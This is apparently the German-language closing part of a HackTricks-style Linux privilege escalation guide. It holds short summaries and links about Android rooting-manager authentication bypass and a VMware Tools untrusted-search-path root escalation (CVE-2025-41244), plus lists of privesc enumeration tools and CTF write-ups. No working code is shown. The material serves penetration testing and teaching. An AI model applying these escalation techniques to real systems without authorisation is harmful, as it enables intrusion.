**systemd** tritt als moderner Init- und Service-Manager auf und bietet erweiterte Funktionen wie bedarfsabhängiges Starten von Daemons, Automount-Verwaltung und Snapshots des Systemzustands. Es organisiert Dateien unter `/usr/lib/systemd/` für Distributionspakete und `/etc/systemd/system/` für Administratoranpassungen und vereinfacht so die Systemverwaltung.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android-Rooting-Frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität an einen Userspace-Manager freizugeben. Schwache Manager-Authentifizierung (z. B. Signaturprüfungen basierend auf FD-Reihenfolge oder unsichere Passwortschemata) kann es einer lokalen App ermöglichen, den Manager zu imitieren und auf bereits gerooteten Geräten Root-Rechte zu erlangen. Mehr dazu und Exploitation-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Erkennung in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Kommandozeilen extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Zu großzügige Patterns (z. B. die Verwendung von \S) können auf von Angreifern abgelegte Listener in beschreibbaren Orten (z. B. /tmp/httpd) matchen, was zur Ausführung als root führt (CWE-426 Untrusted Search Path).

Mehr dazu und ein generalisiertes Pattern, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool zur Suche nach lokalen Linux privilege escalation Vektoren:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
